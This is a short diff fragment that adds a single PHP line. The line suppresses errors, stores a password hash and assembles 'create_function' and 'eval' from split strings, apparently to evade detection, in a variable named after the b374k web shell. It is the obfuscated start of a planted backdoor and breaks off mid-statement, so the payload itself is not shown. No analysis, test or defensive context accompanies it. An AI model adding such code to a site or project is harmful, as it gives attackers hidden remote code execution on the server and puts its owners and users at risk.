@@ -1,0 +1,1 @@
+<?php Error_Reporting(0); $s_pass = "741721fcb0bfc1f04405d8c82e436cab5ffcb141"; $s_func="cr"."eat"."e_fun"."cti"."on";$b374k=@$s_func('$x,$y','ev'.'al'.'("\$s_pass=\"$y\";?>
